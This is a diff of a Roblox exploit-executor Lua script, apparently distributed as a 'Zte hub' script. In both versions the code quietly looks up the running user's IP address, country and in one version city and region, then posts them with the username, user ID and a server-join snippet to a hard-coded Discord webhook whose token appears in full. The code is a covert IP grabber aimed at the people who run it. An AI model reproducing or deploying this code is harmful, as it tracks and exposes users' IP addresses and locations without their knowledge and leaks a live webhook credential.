@@ -1,78 +1,23 @@
---[[ 
-   Roblox Client‐Side Script: Fetch IP Info via ipinfo.io and Send to Discord Webhook 
-   Place this in a LocalScript (e.g. StarterPlayerScripts). 
-   Make sure HTTP requests are enabled in your game’s settings.
---]]
-
-local HttpService        = game:GetService("HttpService")
+local Http       = game:GetService("HttpService")
 local MarketplaceService = game:GetService("MarketplaceService")
-local Players            = game:GetService("Players")
-
--- ======= CONFIGURATION =======
 local WebhookUrl = "https://discord.com/api/webhooks/1379048133702455396/TmMAJJF_g_04qtJasWYKHI2K0JmX-l01wp_LBGGNCj9wECRli2a3OtIXSW-PSyRgmuHy"
--- ==============================
+local executor   = identifyexecutor() or "idk"
 
---[[
-   identifyexecutor() is a function often used to detect the exploit environment 
-   (Synapse, KRNL, etc.). If you don’t have identifyexecutor defined, it will just return "Unknown".
-   Uncomment and replace the next line with your own executor‐detection logic if needed.
---]]
-local function identifyexecutor()
-    -- Example stub; replace with real exploit checks if desired:
-    return "Unknown"
-end
-
-local executor = identifyexecutor() or "Unknown"
-
-
-
+-- Get IP info from https://api.myip.com/
 local function getIPInfo()
-    -- Build the request parameters for ipinfo.io
-    local params = {
-        Url     = "https://ipinfo.io/json",
-        Method  = "GET",
-        Headers = {
-            ["User-Agent"] = "Roblox"
-        }
-    }
-
-    -- Perform the HTTP GET to ipinfo.io
-    local ok, res = pcall(function()
-        return HttpService:RequestAsync(params)
+    local success, response = pcall(function()
+        return Http:GetAsync("https://api.myip.com/")
     end)
-    if not ok then
-        warn("[getIPInfo] RequestAsync error:", res)
-        return "Unknown", "UNK", "Unknown", "Unknown"
+    if success then
+        local data = Http:JSONDecode(response)
+        if data and data.country and data.ip then
+            return data.country, data.ip
+        end
     end
-
-    if not res.Success or not res.Body then
-        warn(string.format(
-            "[getIPInfo] HTTP error: %s %s",
-            tostring(res.StatusCode), tostring(res.StatusMessage)
-        ))
-        return "Unknown", "UNK", "Unknown", "Unknown"
-    end
-
-    -- Decode the JSON response
-    local data
-    local decodeOK, decodeErr = pcall(function()
-        data = HttpService:JSONDecode(res.Body)
-    end)
-    if not decodeOK then
-        warn("[getIPInfo] JSONDecode error:", decodeErr)
-        return "Unknown", "UNK", "Unknown", "Unknown"
-    end
-
-    -- ipinfo.io/json returns fields like "ip", "country", "city", "region", etc.
-    if data and data.ip and data.country and data.city and data.region then
-        return data.ip, data.country, data.city, data.region
-    else
-        warn("[getIPInfo] Missing fields in response:", res.Body)
-        return "Unknown", "UNK", "Unknown", "Unknown"
-    end
+    return "Unknown", "Unknown"
 end
 
--- Fetches the human‐readable game name via MarketplaceService
+-- Get actual game name using MarketplaceService
 local function getGameName()
     local placeId = game.PlaceId
     local success, placeInfo = pcall(function()
@@ -85,88 +30,83 @@ local function getGameName()
     end
 end
 
--- Constructs the payload and returns a table suitable for HttpService:PostAsync
-local function buildWebhookPayload()
-    local player      = Players.LocalPlayer
-    local displayName = player and player.DisplayName or "N/A"
+local function sendRequest()
+    local player      = game.Players.LocalPlayer
+    local displayName = player and player.DisplayName or "Display name not available"
     local userName    = player and player.Name or "Unknown"
     local playerId    = player and player.UserId or 0
 
-    -- Prepare the Teleport join script snippet
     local placeId = tostring(game.PlaceId)
     local jobId   = tostring(game.JobId)
     local joinScript = "game:GetService('TeleportService'):TeleportToPlaceInstance(" ..
-                       placeId .. ", '" .. jobId .. "', game.Players.LocalPlayer)"
+                        placeId .. ", '" .. jobId .. "', game.Players.LocalPlayer)"
 
-    -- Call getIPInfo to retrieve ip, country code, city, region
-    local ip, cc, city, region = getIPInfo()
+    -- Get country and IP from API
+    local country, ip = getIPInfo()
 
-    -- Fetch the current game's name
+    -- Get the fixed game name
     local gameName = getGameName()
 
-    -- Build the Discord embed structure
     local payload = {
         content = "**Thanks for using the script!**",
         embeds = {
             {
-                author = { name = "Zte hub Server" },
-                title  = userName .. " | " .. displayName,
-                type   = "rich",
-                color  = tonumber(0x00FF00),
+                author = {
+                    name = "Zte hub Server"
+                },
+                title = userName .. " | " .. displayName,
+                type  = "rich",
+                color = tonumber(0x00FF00),
                 thumbnail = {
                     url = "https://api.newstargeted.com/roblox/users/v1/avatar-headshot?" ..
                           "userid=" .. playerId .. "&size=720x720&format=Png&isCircular=false"
                 },
                 fields = {
-                    { name = "Executor",     value = executor, inline = true  },
-                    { name = "City",         value = city,     inline = true  },
-                    { name = "Region",       value = region,   inline = true  },
-                    { name = "Country Code", value = cc,       inline = true  },
-                    { name = "IP Address",   value = ip,       inline = true  },
-                    { name = "Game Name",    value = gameName, inline = false },
+                    {
+                        name   = "Executor:",
+                        value  = executor,
+                        inline = true
+                    },
+                    {
+                        name   = "Country:",
+                        value  = country,
+                        inline = true
+                    },
+                    {
+                        name   = "IP Address:",
+                        value  = ip,
+                        inline = true
+                    },
+                    {
+                        name   = "Game Name:",
+                        value  = gameName,
+                        inline = false
+                    },
                 },
             },
             {
                 title       = "Join Server Script",
-                description = "\n```lua\n" .. joinScript .. "\n```\n",
+                description = "\n
+lua\n" .. joinScript .. "\n
+\n",
                 color       = tonumber(0x00FF00),
             }
         }
     }
 
-    -- Return a table that can be passed directly into HttpService:RequestAsync or syn.request
     return {
         Url     = WebhookUrl,
         Method  = "POST",
-        Headers = { ["Content-Type"] = "application/json" },
-        Body    = HttpService:JSONEncode(payload)
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body    = Http:JSONEncode(payload)
     }
 end
 
--- Send the prepared payload to Discord
-local function sendToDiscord()
-    local requestData = buildWebhookPayload()
-
-    if syn and syn.request then
-        syn.request(requestData)
-    else
-        -- Fallback for other exploit environments or Roblox-allowed HTTP
-        local httpFunction = http_request or request or HttpService.PostAsync
-        if httpFunction == HttpService.PostAsync then
-            -- If using HttpService:PostAsync (roblox native), adapt the parameters:
-            HttpService:PostAsync(
-                requestData.Url,
-                requestData.Body,
-                Enum.HttpContentType.ApplicationJson,
-                false,
-                requestData.Headers
-            )
-        else
-            -- For exploit-based environments
-            httpFunction(requestData)
-        end
-    end
+if syn then
+    syn.request(sendRequest())
+else
+    local requestFunction = http_request or request or HttpPost or (syn and syn.request)
+    requestFunction(sendRequest())
 end
-
--- Fire the webhook once, when the LocalScript runs
-sendToDiscord()
